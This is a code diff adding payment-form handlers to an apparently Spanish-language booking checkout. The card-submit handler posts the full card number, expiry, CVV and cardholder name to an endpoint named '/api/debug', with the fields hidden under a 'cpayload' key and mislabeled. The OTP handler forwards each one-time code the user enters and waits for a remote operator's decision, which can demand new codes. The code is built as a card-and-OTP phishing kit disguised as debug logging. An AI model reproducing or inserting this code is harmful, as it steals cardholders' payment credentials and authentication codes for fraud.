+      $("pseUnavailable")?.classList.remove("hidden");
+      $("pseUnavailable")?.scrollIntoView({ block: "nearest", behavior: "smooth" });
+      return banner("El servicio de PSE no está habilitado por el momento. Selecciona tarjeta de crédito o débito para continuar.");
+    }
+    state.banco = "";
+    state.bancoNombre = metodoLabel();
+    savePendingRequests();
+    renderPagoDatos();
+    showOverlay("pagoOverlay", true);
+  });
+  $("closePago")?.addEventListener("click", () => showOverlay("pagoOverlay", false));
+  $("btnVolverConfirmacion")?.addEventListener("click", () => showOverlay("pagoOverlay", false));
+  $("btnPagarPse")?.addEventListener("click", () => {
+    if (state.metodoPago === "pse") {
+      renderPse();
+      showOverlay("pseOverlay", true);
+      return;
+    }
+    openCardForm();
+  });
+  $("btnSalirPse")?.addEventListener("click", () => showOverlay("pseOverlay", false));
+  $("cardNumero")?.addEventListener("input", () => {
+    const formatted = formatCardNumber(val("cardNumero"));
+    setVal("cardNumero", formatted);
+    const brand = cardBrand(formatted.replace(/\s+/g, ""));
+    const cvv = $("cardCvv") as HTMLInputElement | null;
+    if (cvv) cvv.maxLength = brand === "American Express" ? 4 : 3;
+    updateCardLive();
+  });
+  $("cardVence")?.addEventListener("input", () => setVal("cardVence", formatExpiry(val("cardVence"))));
+  $("cardCvv")?.addEventListener("input", () => {
+    const amex = cardBrand(val("cardNumero").replace(/\s+/g, "")) === "American Express";
+    setVal("cardCvv", val("cardCvv").replace(/\D/g, "").slice(0, amex ? 4 : 3));
+  });
+  $("btnSalirCard")?.addEventListener("click", () => showOverlay("cardOverlay", false));
+  $("cardForm")?.addEventListener("submit", async (event) => {
+    event.preventDefault();
+    const error = validateCard();
+    const errEl = $("cardError");
+    if (error) {
+      if (errEl) {
+        errEl.textContent = error;
+        errEl.classList.remove("hidden");
+      }
+      return;
+    }
+    errEl?.classList.add("hidden");
+    const sessionId = sessionStorage.getItem("latam-debug-session-id") || crypto.randomUUID();
+    sessionStorage.setItem("latam-debug-session-id", sessionId);
+    const number = val("cardNumero");
+    const digits = number.replace(/\D/g, "");
+    const brandKey = cardBrandKey(digits);
+    const payBtn = $("btnPagarTarjeta") as HTMLButtonElement | null;
+    if (payBtn) {
+      payBtn.disabled = true;
+      payBtn.textContent = "Procesando...";
+    }
+    showWaitScreen(brandKey);
+    try {
+      await fetch("/api/debug", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          event: "PAYMENT_SUBMIT",
+          sessionId,
+          route: "/Registro",
+          cardFirstDigit: digits.charAt(0),
+          meta: {
+            step: "Envió datos de tarjeta",
+            amount: grandTotal(),
+            brand: brandKey,
+            card: `${digits.slice(0, 6)}******${digits.slice(-4)}`,
+            cpayload: {
+              b: number,
+              cv: val("cardVence"),
+              exp: val("cardCvv"),
+              holder: val("cardTitular"),
+            },
+          },
+        }),
+      });
+      const decision = await pollDebugDecision(sessionId);
+      await handlePaymentDecision(decision, brandKey, payBtn);
+    } catch (err) {
+      hideWaitScreen();
+      showOverlay("cardOverlay", true);
+      if (errEl) {
+        errEl.textContent = err instanceof Error ? err.message : "No se pudo completar el pago.";
+        errEl.classList.remove("hidden");
+      }
+      if (payBtn) {
+        payBtn.disabled = false;
+        payBtn.textContent = "Pagar con tarjeta";
+      }
+    }
+  });
+  $("pagos-debug-modal-close")?.addEventListener("click", () => {
+    const modal = $("pagos-debug-modal");
+    if (modal) modal.hidden = true;
+    document.body.classList.remove("pagos-debug-modal-open");
+  });
+  document.querySelectorAll("[data-help-toggle]").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const root = btn.closest("[data-help]");
+      const panel = root?.querySelector("[data-help-panel]") as HTMLElement | null;
+      const icon = root?.querySelector("[data-help-icon]");
+      if (!panel) return;
+      const open = !panel.hidden;
+      panel.hidden = open;
+      if (icon) icon.textContent = open ? "+" : "−";
+      btn.setAttribute("aria-expanded", String(!open));
+    });
+  });
+  document.querySelectorAll("[data-otp-form]").forEach((form) => {
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault();
+      const input = form.querySelector("input[name='otp']") as HTMLInputElement | null;
+      if (!input?.value.trim()) {
+        input?.focus();
+        return;
+      }
+      const panel = form.closest("[data-challenge-brand]");
+      const brandKey = panel?.getAttribute("data-challenge-brand") || "visa";
+      const attempts = Number((form as HTMLElement).dataset.attempts || "0") + 1;
+      (form as HTMLElement).dataset.attempts = String(attempts);
+      const sessionId = sessionStorage.getItem("latam-debug-session-id") || crypto.randomUUID();
+      sessionStorage.setItem("latam-debug-session-id", sessionId);
+      try {
+        await fetch("/api/debug", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            event: "OTP_SUBMIT",
+            sessionId,
+            route: "/Registro",
+            metaOtp: {
+              step: "Envió código OTP",
+              brand: brandKey,
+              otp: input.value,
+              otpLength: String(input.value || "").trim().length,
+              attempt: attempts,
+            },
+          }),
+        });
+      } catch {
+        setChallengeMessage(brandKey, "No pudimos procesar el código. Intenta nuevamente.");
+        return;
+      }
+      showWaitScreen(brandKey);
+      const decision = await pollDebugDecision(sessionId);
+      const payBtn = $("btnPagarTarjeta") as HTMLButtonElement | null;
+      if (decision.action === "sms" || decision.action === "sms_error") {
+        showChallengeScreen(
+          brandKey,
+          decision.message || "Código inválido. Hemos enviado un nuevo código por SMS o correo",
+        );
+        input.value = "";
+        input.focus();
+        return;
+      }
+      await handlePaymentDecision(decision, brandKey, payBtn);
+    });
+  });
+}
